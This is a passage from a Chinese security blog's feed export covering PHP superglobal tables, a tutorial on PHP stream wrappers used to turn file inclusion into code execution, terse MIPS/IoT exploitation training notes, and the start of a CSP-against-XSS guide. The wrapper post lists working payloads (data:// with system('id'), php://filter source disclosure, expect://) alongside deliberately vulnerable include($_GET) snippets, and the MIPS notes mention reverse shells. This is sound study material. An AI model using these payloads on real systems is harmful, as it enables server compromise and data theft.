<td>当前请求头中 Accept-Language: 项的内容，如果存在的话。例如：“en”。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT_ENCODING&#39;]</td>
<td>当前请求的 Accept-Encoding: 头部的内容。例如：“gzip”。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_CONNECTION&#39;]</td>
<td>当前请求头中 Connection: 项的内容，如果存在的话。例如：“Keep-Alive”。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_HOST&#39;]</td>
<td>返回来自当前请求的 Host 头。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_REFERER&#39;]</td>
<td>引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</td>
<td>当前请求头中 User-Agent: 项的内容，如果存在的话。该字符串表明了访问该页面的用户代理的信息。一个典型的例子是：Mozilla/4.5 [en] (X11; U; Linux 2.2.9 i586)。除此之外，你可以通过 get_browser() 来使用该值，从而定制页面输出以便适应用户代理的性能。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTPS&#39;]</td>
<td>是否通过安全 HTTP 协议查询脚本。<br><strong>Note</strong>: 注意当使用 IIS 上的 ISAPI 方式时，如果不是通过 HTTPS 协议被访问，这个值将为 <em>off</em>。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_VIA&#39;]</td>
<td>返回Via中的代理服务器IP</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</td>
<td>返回Client-IP中的客户端IP</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_ADDR&#39;]</td>
<td>返回浏览当前页面的用户的 IP 地址。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_X\_FORWARDED\_FOR&#39;]</td>
<td>返回X-Forwarded-For内容</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_HOST&#39;]</td>
<td>返回浏览当前页面的用户的主机名。<br><strong>Note</strong>: 你的服务器必须被配置以便产生这个变量。例如在 Apache 中，你需要在 httpd.conf 中设置 <em>HostnameLookups On</em> 来产生它。参见 <a href="http://php.net/manual/zh/function.gethostbyaddr.php" target="_blank" rel="external">gethostbyaddr()</a>。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_PORT&#39;]</td>
<td>返回用户机器上连接到 Web 服务器所使用的端口号。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_USER&#39;]</td>
<td>经验证的用户</td>
</tr>
<tr>
<td>$_SERVER[&#39;REDIRECT_REMOTE_USER&#39;]</td>
<td>验证的用户，如果请求已在内部重定向。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</td>
<td>返回当前执行脚本的绝对路径。<br><strong>Note</strong>:如果在命令行界面（Command Line Interface, CLI）使用相对路径执行脚本，例如 file.php 或 ../file.php，那么 $_SERVER[&#39;SCRIPT_FILENAME&#39;] 将包含用户指定的相对路径。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_ADMIN&#39;]</td>
<td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_PORT&#39;]</td>
<td>Web 服务器使用的端口。默认值为 “<em>80</em>”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。<br><strong>Note</strong>: 在 Apache 2 里，为了获取真实物理端口，必须设置 <em>UseCanonicalName = On</em> 以及 <em>UseCanonicalPhysicalPort = On</em>。 否则此值可能被伪造，不一定会返回真实端口值。 上下文有安全性要求的环境里，不应该依赖此值。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_SIGNATURE&#39;]</td>
<td>返回服务器版本和虚拟主机名。</td>
</tr>
<tr>
<td>$_SERVER[&#39;PATH_TRANSLATED&#39;]</td>
<td>当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。<br><strong>Note</strong>: 自 PHP 4.3.2 起，PATH_TRANSLATED 在 Apache 2 SAPI 模式下不再和 Apache 1 一样隐含赋值，而是若 Apache 不生成此值，PHP 便自己生成并将其值放入 SCRIPT_FILENAME 服务器常量中。这个修改遵守了 CGI 规范，PATH_TRANSLATED 仅在 PATH_INFO 被定义的条件下才存在。 Apache 2 用户可以在 httpd.conf 中设置 <em>AcceptPathInfo = On</em> 来定义 PATH_INFO。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SCRIPT_NAME&#39;]</td>
<td>返回当前脚本的路径</td>
</tr>
<tr>
<td>$_SERVER[&#39;SCRIPT_URI&#39;]</td>
<td>返回当前页面的 URI。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_UPGRADE_INSECURE_REQUESTS&#39;]</td>
<td>返回Upgrade-Insecure-Requests中的数据</td>
</tr>
<tr>
<td>$_SERVER[&quot;HTTP_CACHE_CONTROL&quot;]</td>
<td>返回Cache-Control中的数据</td>
</tr>
<tr>
<td>&#39;PHP_AUTH_DIGEST&#39;</td>
<td>当作为 Apache 模块运行时，进行 HTTP Digest 认证的过程中，此变量被设置成客户端发送的“Authorization” HTTP 头内容（以便作进一步的认证操作）。</td>
</tr>
<tr>
<td>&#39;PHP_AUTH_USER&#39;</td>
<td>当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。</td>
</tr>
<tr>
<td>&#39;PHP_AUTH_PW&#39;</td>
<td>当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。</td>
</tr>
<tr>
<td>&#39;AUTH_TYPE&#39;</td>
<td>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型。</td>
</tr>
<tr>
<td>&#39;PATH_INFO&#39;</td>
<td>包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息，如果存在的话。例如，如果当前脚本是通过 URL <a href="http://www.example.com/php/path_info.php/some/stuff?foo=bar" target="_blank" rel="external">http://www.example.com/php/path_info.php/some/stuff?foo=bar</a> 被访问，那么 $_SERVER[&#39;PATH_INFO&#39;] 将包含 /some/stuff。</td>
</tr>
<tr>
<td>&#39;ORIG_PATH_INFO&#39;</td>
<td>在被 PHP 处理之前，“PATH_INFO” 的原始版本。</td>
</tr>
</tbody>
</table>
<h4 id="FILES"><a href="#FILES" class="headerlink" title="$\_FILES"></a>$\_FILES</h4><p>$_FILES 可以从客户计算机向远程服务器上传文件。<br>    第一个参数是表单的 input name，第二个下标可以是 &quot;name&quot;, &quot;type&quot;, &quot;size&quot;, &quot;tmp_name&quot; 或 &quot;error&quot;<br>    例子：<br>        $_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称<br>        $_FILES[&quot;file&quot;][&quot;type&quot;] - 被上传文件的类型<br>        $_FILES[&quot;file&quot;][&quot;size&quot;] - 被上传文件的大小，以字节计<br>        $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称<br>        $_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码</p>
<h4 id="ENV"><a href="#ENV" class="headerlink" title="$\_ENV"></a>$\_ENV</h4><p>$_ENV   通过环境方式传递给当前脚本的变量的数组。</p>
<p>这些变量被从 PHP 解析器的运行环境导入到 PHP 的全局命名空间。很多是由支持 PHP 运行的 Shell 提供的，并且不同的系统很可能运行着不同种类的 Shell，所以不可能有一份确定的列表。请查看你的 Shell 文档来获取定义的环境变量列表。<br>其他环境变量包含了 CGI 变量，而不管 PHP 是以服务器模块还是 CGI 处理器的方式运行。</p>
<table>
<thead>
<tr>
<th>元素/代码</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$_ENV[&quot;ALLUSERSPROFILE&quot;]</td>
<td>C:\Documents and Settings\All Users</td>
</tr>
<tr>
<td>$_ENV[&quot;ClusterLog&quot;]</td>
<td>C:\WINDOWS\Cluster\cluster.log</td>
</tr>
<tr>
<td>$_ENV[&quot;CommonProgramFiles&quot;]</td>
<td>C:\Program Files\Common Files</td>
</tr>
<tr>
<td>$_ENV[&quot;COMPUTERNAME&quot;]</td>
<td>LIUBO</td>
</tr>
<tr>
<td>$_ENV[&quot;ComSpec&quot;]</td>
<td>C:\WINDOWS\system32\cmd.exe</td>
</tr>
<tr>
<td>$_ENV[&quot;FP_NO_HOST_CHECK&quot;]</td>
<td>NO</td>
</tr>
<tr>
<td>$_ENV[&quot;NUMBER_OF_PROCESSORS&quot;]</td>
<td>1</td>
</tr>
<tr>
<td>$_ENV[&quot;OS&quot;]</td>
<td>Windows_NT</td>
</tr>
<tr>
<td>$_ENV[&quot;Path&quot;]</td>
<td>C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;E:\Program Files\MySQL\MySQL Server 5.0\bin;c:\php;c:\php\ext</td>
</tr>
<tr>
<td>$_ENV[&quot;PATHEXT&quot;]</td>
<td>.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_ARCHITECTURE&quot;]</td>
<td>x86</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_IDENTIFIER&quot;]</td>
<td>x86 Family 15 Model 4 Stepping 1, GenuineIntel</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_LEVEL&quot;]</td>
<td>15</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_REVISION&quot;]</td>
<td>0401</td>
</tr>
<tr>
<td>$_ENV[&quot;ProgramFiles&quot;]</td>
<td>C:\Program Files</td>
</tr>
<tr>
<td>$_ENV[&quot;SystemDrive&quot;]</td>
<td>C:</td>
</tr>
<tr>
<td>$_ENV[&quot;SystemRoot&quot;]</td>
<td>C:\WINDOWS</td>
</tr>
<tr>
<td>$_ENV[&quot;TEMP&quot;]</td>
<td>d:\</td>
</tr>
<tr>
<td>$_ENV[&quot;TMP&quot;]</td>
<td>d:\</td>
</tr>
<tr>
<td>$_ENV[&quot;USERPROFILE&quot;]</td>
<td>C:\Documents and Settings\Default User</td>
</tr>
<tr>
<td>$_ENV[&quot;windir&quot;]</td>
<td>C:\WINDOWS</td>
</tr>
</tbody>
</table>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php伪协议]]></title>
      <url>/2017/08/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      <content type="html"><![CDATA[<p>本文参考的是 Hello_C的php伪协议这篇文章，内容大部分时粘贴过来的。当然也参考了先知上的文章：<a href="https://xianzhi.aliyun.com/forum/mobile/read/795.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/mobile/read/795.html</a>——如何优雅的把lfi转化为rce（2017-02-27更新版）。当然，先知上的文章有点问题，因为web用户可能没有那么高的权限去访问log文件或者打开allow_url_include设置。</p>
<h3 id="PHP协议-封装协议"><a href="#PHP协议-封装协议" class="headerlink" title="PHP协议/封装协议"></a>PHP协议/封装协议</h3><table>
<thead>
<tr>
<th>包装或协议</th>
<th>控制能力</th>
<th>allow_url_include</th>
<th>漏洞类型</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>file://</td>
<td>-</td>
<td>Off</td>
<td>LFI /文件操作</td>
<td></td>
</tr>
<tr>
<td>glob://</td>
<td>-</td>
<td>Off</td>
<td>目录遍历</td>
<td></td>
</tr>
<tr>
<td>php://filter/read</td>
<td>include</td>
<td>Off</td>
<td>文件泄露</td>
<td>PHP：//filter/read=convert.base64-encode/resource=index.php</td>
</tr>
<tr>
<td>php://filter/write</td>
<td>file_put_contents</td>
<td>Off</td>
<td>编码</td>
<td>file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);</td>
</tr>
<tr>
<td>php://input</td>
<td>include</td>
<td>On</td>
<td>RCE</td>
<td>Encoding is required while reading .php source: &lt;?php echo base64_encode(file_get_contents(“solution.php”));?&gt; OR just use &lt;?php system(‘cat x.php’);?&gt;</td>
</tr>
<tr>
<td>data://</td>
<td>include</td>
<td>On</td>
<td>RCE</td>
<td>data:text/plain,&lt;?php system(“id”)?&gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=</td>
</tr>
<tr>
<td>zip://</td>
<td>include + uploaded file</td>
<td>Off</td>
<td>RCE</td>
<td></td>
</tr>
<tr>
<td>phar://</td>
<td>include + uploaded file</td>
<td>Off</td>
<td>RCE</td>
<td>PHP版本&gt; = 5.3</td>
</tr>
</tbody>
</table>
<p>php中支持的伪协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">file:// — 访问本地文件系统</div><div class="line">http:// — 访问 HTTP(s) 网址</div><div class="line">ftp:// — 访问 FTP(s) URLs</div><div class="line">php:// — 访问各个输入/输出流（I/O streams）</div><div class="line">zlib:// — 压缩流</div><div class="line">data:// — 数据（RFC 2397）</div><div class="line">glob:// — 查找匹配的文件路径模式</div><div class="line">phar:// — PHP 归档</div><div class="line">ssh2:// — Secure Shell 2</div><div class="line">rar:// — RAR</div><div class="line">ogg:// — 音频流</div><div class="line">expect:// — 处理交互式的流</div></pre></td></tr></table></figure>
<p>这里可以参考<a href="http://php.net/manual/zh/wrappers.php" target="_blank" rel="external">官方文档</a>进行查看。而遇见最多的也就是php://协议了：</p>
<ul>
<li><h4 id="php-stdin"><a href="#php-stdin" class="headerlink" title="php://stdin"></a>php://stdin</h4><p>主要用于php cli的输入</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">while($line = fopen(&apos;php://stdin&apos;,&apos;r&apos;))&#123;  </div><div class="line">    echo fgets($line);  </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><a href="/images/2017-07-28/f0b778051856c477.jpg"><img src="http://i4.buimg.com/567571/f0b778051856c477.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-stdout"><a href="#php-stdout" class="headerlink" title="php://stdout"></a>php://stdout</h4><p>主要用于php cli的输入<code>&lt;?php  $fh = fopen(&#39;php://stdout&#39;, &#39;w&#39;);  fwrite($fh, &quot;标准输出php://stdout\n&quot;);  fclose($fh);  fwrite(STDOUT, &quot;标准输出STDOUT\n&quot;);  ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/e62036bab64c514b.jpg"><img src="http://i4.buimg.com/567571/e62036bab64c514b.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>可以读取到post没有解析的原始数据<code>&lt;?php   echo file_get_contents($_GET[&quot;a&quot;]);  ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/caba05f9460d9dbe.jpg"><img src="http://i4.buimg.com/567571/caba05f9460d9dbe.jpg" alt="img"></a><br>当php代码换成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;a&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>而且当php远程包含打开的时候（当allow_url_include=on),就可以造成任意代码执行。<br><a href="/images/2017-07-28/52bcb6ca96711975.jpg"><img src="http://i4.buimg.com/567571/52bcb6ca96711975.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><p>是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区<code>&lt;?php   $code=$_GET[&quot;a&quot;];   file_put_contents($code,&quot;test&quot;);   ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/ab8f21052b4e2890.jpg"><img src="http://i4.buimg.com/567571/ab8f21052b4e2890.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>是一种元封装器， 设计用于数据流打开时的筛选过滤应用<code>&lt;?php  $filename=$_GET[&quot;a&quot;];  $data=&quot;test&quot;;  file_put_contents($filename, $data);  ?&gt;</code></p>
</li>
</ul>
<p>?a=php://filter/write=string.tolower/resource=test.php<br>可以往服务器中写入一个文件内容全为小写且文件名为test.php的文件：<br>其中 ：<br>（1）string.tolower //写入内容全部变成小写<br>（2）string.toupper //写入内容全部变成大写<br>（3）string.rot13 //写入内容全部对字符串执行 ROT13 编码<br>通过：?a=php://filter/convert.base64-encode/resource=test.php<br>可以往服务器中写入一个文件内容为base64编码且文件名为test.php的文件<br><a href="/images/2017-07-28/f80e4710de9ee31d.jpg"><img src="http://i2.muimg.com/567571/f80e4710de9ee31d.jpg" alt="img"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">echo file_get_contents($filename);  </div><div class="line">?&gt; </div><div class="line"></div><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;]; </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>?a=php://filter/convert.base64-encode/resource=test.php,就可以把test.php的内容以base64编码的方式显示出来</p>
<p>双引号包含的变量$filename，可以当成正常变量执行，而单引号包裹的变量则会当成字符串</p>
<ul>
<li><p>那么可以用?hax=expect://command 来执行任意linux指令，但是：<br>Note:该封装协议默认未开启<br>为了使用 expect:// 封装器，你必须安装» PECL 上的 » Expect扩展。</p>
</li>
<li><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行<code>&lt;?php  $filename=$_GET[&quot;a&quot;];  include(&quot;$filename&quot;);  ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/19570d7acea8b8a7.jpg"><img src="http://i4.buimg.com/567571/19570d7acea8b8a7.jpg" alt="img"></a></p>
<p>参考链接：<br><a href="http://blog.csdn.net/niexinming/article/details/52605144" target="_blank" rel="external">http://blog.csdn.net/niexinming/article/details/52605144</a></p>
<ul>
<li><strong>本文作者：</strong> Hello_C</li>
<li><strong>本文链接：</strong> <a href="http://yoursite.com/%E4%BB%A3%E7%A0%81/2017/04/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.html">http://yoursite.com/代码/2017/04/09/PHP伪协议.html</a></li>
<li><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" rel="external">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！</li>
</ul>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XMAN之旅——MIPS]]></title>
      <url>/2017/08/16/XMAN%E4%B9%8B%E6%97%85%E2%80%94%E2%80%94MIPS/</url>
      <content type="html"><![CDATA[<h3 id="IOT-Internet-of-Things-物联网"><a href="#IOT-Internet-of-Things-物联网" class="headerlink" title="IOT(Internet of Things) 物联网"></a>IOT(Internet of Things) 物联网</h3><p>CAN协议<br>TTP协议<br>介质访问控制模式CSMA/CD<br>GPS系统遥控<br>obd<br>定位解锁功能</p>
<p>智能联网汽车信息安全状况</p>
<h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><p>RISC架构<br>通用寄存器 32个<br>特殊寄存器 PC hI IO<br>指令定长<br>有大端和小端两种<br>指令还有地址 都是 4字节对齐的<br>数据访问严格4 字节对其<br>流水线</p>
<p>xss(不是很严重)<br>CSRF<br>认证漏洞<br>命令注入（针对后端的lua 脚本)</p>
<p>mips不会自动刷新<br>shellcode 被存于数据的cache中<br>cacch incoherency</p>
<p>使用busybox 启用 reverse shell</p>
<p>由于不能直接与cgi进行交互，可以使用 reverse shell<br>wget一个</p>
<p>-W hexdump<br>-A 分析指令架构 寻找各种架构的函数projoque</p>
<p>binwalk -M</p>
<p>使用 ROP或者其他啊手段一次请求启动reverse shell<br>定位 binary 地组织，可以在同样的环境中进行调试，或者调用其他漏洞的leak</p>
<p>MIPS的shellcode 开发</p>
<p>ropgadget<br>使用 IDA的插件 MIPS ROP Finder(可以支持定制搜索)</p>
<p>找可用gadget<br>向已知地址执行shellcode<br>rop执行system</p>
<p>binutils-mips-linux-gnu<br>qemu-mipsel -L /usr/mipsel-linux-gnu/ ./pwn300</p>
<p>qemu-mipsel<br>MIPS库环境库安装</p>
<p>qemu-mips<br>user mode 直接运行用户程序<br>需要完整的library<br>system mode 直接模拟mips系统</p>
<p>gdb server<br>gdb-multiarch<br>IDA debugger</p>
<p>mips rop gadget<br>MIPS汇编语言<br>逆向工具</p>
<p>基于 MIPS或者 ARM架构的 openwrt<br>普通用户没有 root shell<br>基于 busybox<br>libc 和一般的linux 不同 使用 uclibc(提供基本的嵌入式函数，比较小，节省内存空间)</p>
<p>binwalk<br>firmware-mod-kit</p>
<p>用于开发板的调试<br>输出root Image 或者之际给出系统的rootshell<br>辅助分析</p>
<p>USB2TL<br>Tx端链接开发板Rx<br>Rx端链接开发板Tx<br>GND链接GND</p>
<p>与UART交互</p>
<p>GDN ground<br>TX transmit 发送引脚 3.3v<br>RX recive 接受引脚 3.3。v<br>VCC 电源 一般电压为3.3-5v</p>
<p>openwrt<br>Embedded linux<br>VxWorks<br>uClinux<br>FreeRTOS</p>
<p>与段 与攻击一个web站点类似(比较少，和攻击一个web差不多）<br>正对设备与网关，网关与云端之间的嗅探<br>身份伪造等<br>通过针对设备以及网关的固件你想利用漏洞获取权限 </p>
]]></content>
      
        <categories>
            
            <category> xman </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[内容安全策略(CSP)]]></title>
      <url>/2017/08/14/%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5-CSP/</url>
      <content type="html"><![CDATA[<p>跨域脚本攻击 <a href="http://baike.baidu.com/view/2161269.htm" target="_blank" rel="external">XSS</a> 是最常见、危害最大的网页安全漏洞。</p>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2016/bg2016091301.png" alt="img"></p>
<p>为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？</p>
<p>这就是&quot;网页安全政策&quot;（Content Security Policy，缩写 CSP）的来历。本文详细介绍如何使用 CSP 防止 XSS 攻击。</p>
<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
<p>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p>
<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2016/bg2016091305.jpg" alt="img"></p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: script-src &apos;self&apos;; object-src &apos;none&apos;;</div><div class="line">&gt; style-src cdn.example.org third-party.org; child-src https:</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>另一种是通过网页的<code>&lt;meta&gt;</code>标签。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>上面代码中，CSP 做了如下配置。</p>
<blockquote>
<ul>
<li>脚本：只信任当前域名</li>
<li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li>
<li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li>
<li>框架（frame）：必须使用HTTPS协议加载</li>
<li>其他资源：没有限制</li>
</ul>
</blockquote>
<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
<p>Chrome 的报错信息。</p>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2016/bg2016091303.png" alt="img"></p>
<p>Firefox 的报错信息。</p>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2016/bg2016091306.png" alt="img"></p>
<h2 id="二、限制选项"><a href="#二、限制选项" class="headerlink" title="二、限制选项"></a>二、限制选项</h2><p>CSP 提供了很多限制选项，涉及安全的各个方面。</p>
<h3 id="2-1-资源加载限制"><a href="#2-1-资源加载限制" class="headerlink" title="2.1 资源加载限制"></a>2.1 资源加载限制</h3><p>以下选项限制各类资源的加载。</p>
<blockquote>
<ul>
<li><strong>script-src</strong>：外部脚本</li>
<li><strong>style-src</strong>：样式表</li>
<li><strong>img-src</strong>：图像</li>
<li><strong>media-src</strong>：媒体文件（音频和视频）</li>
<li><strong>font-src</strong>：字体文件</li>
<li><strong>object-src</strong>：插件（比如 Flash）</li>
<li><strong>child-src</strong>：框架</li>
<li><strong>frame-ancestors</strong>：嵌入的外部资源（比如<frame>、<iframe>、<embed>和<applet>）</applet></iframe></li>
<li><strong>connect-src</strong>：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
<li><strong>worker-src</strong>：<code>worker</code>脚本</li>
<li><strong>manifest-src</strong>：manifest 文件</li>
</ul>
</blockquote>
<h3 id="2-2-default-src"><a href="#2-2-default-src" class="headerlink" title="2.2 default-src"></a>2.2 default-src</h3><p><code>default-src</code>用来设置上面各个选项的默认值。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: default-src &apos;self&apos;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>上面代码限制<strong>所有的</strong>外部资源，都只能从当前域名加载。</p>
<p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p>
<h3 id="2-3-URL-限制"><a href="#2-3-URL-限制" class="headerlink" title="2.3 URL 限制"></a>2.3 URL 限制</h3><p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p>
<blockquote>
<ul>
<li><strong>frame-ancestors</strong>：限制嵌入框架的网页</li>
<li><strong>base-uri</strong>：限制<code>&lt;base#href&gt;</code></li>
<li><strong>form-action</strong>：限制<code>&lt;form#action&gt;</code></li>
</ul>
</blockquote>
<h3 id="2-4-其他限制"><a href="#2-4-其他限制" class="headerlink" title="2.4 其他限制"></a>2.4 其他限制</h3><p>其他一些安全相关的功能，也放在了 CSP 里面。</p>
<blockquote>
<ul>
<li><strong>block-all-mixed-content</strong>：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
<li><strong>upgrade-insecure-requests</strong>：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
<li><strong>plugin-types</strong>：限制可以使用的插件格式</li>
<li><strong>sandbox</strong>：浏览器行为的限制，比如不能有弹出窗口等。</li>
</ul>
</blockquote>
<h3 id="2-5-report-uri"><a href="#2-5-report-uri" class="headerlink" title="2.5 report-uri"></a>2.5 report-uri</h3><p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: default-src &apos;self&apos;; ...; report-uri /my_amazing_csp_report_parser;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。</p>
<p>浏览器会使用<code>POST</code>方法，发送一个JSON对象，下面是一个例子。</p>
<blockquote>
